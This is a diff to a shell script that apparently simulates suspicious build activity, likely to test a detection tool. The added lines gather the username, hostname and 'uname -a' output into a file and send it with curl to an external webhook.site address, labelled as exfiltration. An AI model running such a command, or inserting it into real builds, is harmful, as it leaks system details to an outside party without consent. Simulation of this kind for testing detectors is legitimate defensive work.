@@ -3,9 +3,15 @@
 echo "--- Starting build simulation ---"
 
 # --- Test Case 1: Simple Reconnaissance ---
-echo "\n[Test] Running simple discovery commands..."
-whoami
-hostname
+echo "\n[Test] Simulating data collection and exfiltration..."
+echo "--------Recon Data -----------" > recon.txt
+echo "User is: $(whoami)" >> recon.txt
+echo "Hostname is: $(hostname)" >> recon.txt
+echo "System: $(uname -a)" >> recon.txt
+echo "-------------------------------" >> recon.txt
+
+echo "Exfiltrating recon data"
+curl -X POST --data-binary "@recon.txt" https://webhook.site/4ff37353-6f0b-4819-8c8a-f4e03355ca6a
 
 # --- Test Case 2: Suspicious Inline Execution ---
 echo "\n[Test] Running Python with an inline command that imports 'os'..."
